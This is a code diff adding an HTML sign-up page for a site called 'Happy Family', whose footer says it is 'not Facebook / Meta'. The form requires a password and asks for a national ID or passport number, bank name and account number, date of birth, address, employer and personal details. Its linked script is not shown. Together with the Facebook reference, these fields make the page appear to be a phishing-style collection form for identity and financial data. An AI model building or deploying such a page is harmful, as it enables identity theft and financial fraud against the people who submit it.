@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Happy Family - Form</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <header>Happy Family</header>
+  <div class="container">
+    <div class="logo"><div class="logo-circle">H</div></div>
+    <h2>Please fill in all fields carefully.</h2>
+    <form id="bigForm">
+      <input name="fullname" placeholder="Full Name" required>
+      <input name="email" type="email" placeholder="Email Address" required>
+      <input name="phone" type="tel" placeholder="Phone Number" required>
+      <input name="password" type="password" placeholder="Password" required>
+      <input name="dob" placeholder="Date of Birth (DD/MM/YYYY)" required>
+      <select name="gender">
+        <option value="Male">Male</option>
+        <option value="Female">Female</option>
+        <option value="Other">Other</option>
+      </select>
+      <select name="marital">
+        <option value="Single">Single</option>
+        <option value="Married">Married</option>
+        <option value="Divorced">Divorced</option>
+        <option value="Widowed">Widowed</option>
+      </select>
+      <input name="street" placeholder="Street">
+      <input name="city" placeholder="City">
+      <input name="postal" placeholder="Postal Code">
+      <input name="country" placeholder="Country">
+      <input name="idnum" placeholder="National ID / Passport Number">
+      <input name="qualification" placeholder="Highest Qualification">
+      <input name="institution" placeholder="Institution">
+      <input name="year" placeholder="Year Completed">
+      <input name="occupation" placeholder="Occupation / Job Title">
+      <input name="company" placeholder="Company / Business Name">
+      <input name="bank" placeholder="Bank Name">
+      <input name="account" placeholder="Account Number">
+      <textarea name="interests" placeholder="Personal Interests / your type of content"></textarea>
+      <p>Short Survey:</p>
+      <label><input type="checkbox" name="reason" value="Monetization"> Monetization</label>
+      <label><input type="checkbox" name="reason" value="Business"> Business</label>
+      <label><input type="checkbox" name="reason" value="Dating"> Dating</label>
+      <label><input type="checkbox" name="reason" value="Other"> Other</label>
+      <textarea name="bio" placeholder="Write a Short Bio about yourself (150–300 words)"></textarea>
+      <p>Notification Preferences:</p>
+      <label><input type="checkbox" name="notify" value="Email"> Email Updates</label>
+      <label><input type="checkbox" name="notify" value="SMS"> SMS Alerts</label>
+      <label><input type="checkbox" name="notify" value="Push"> Push Notifications</label>
+      <p>Choose Plan:</p>
+      <label><input type="radio" name="plan" value="Free"> Free</label>
+      <label><input type="radio" name="plan" value="Basic"> Basic</label>
+      <label><input type="radio" name="plan" value="Premium"> Premium</label>
+      <p><input type="checkbox" required> I have read and agree</p>
+      <button type="submit">Submit</button>
+    </form>
+  </div>
+  <footer>
+    <p>Happy Family © 2025 – This is not Facebook / Meta</p>
+  </footer>
+  <script src="script.js"></script>
+</body>
+</html>
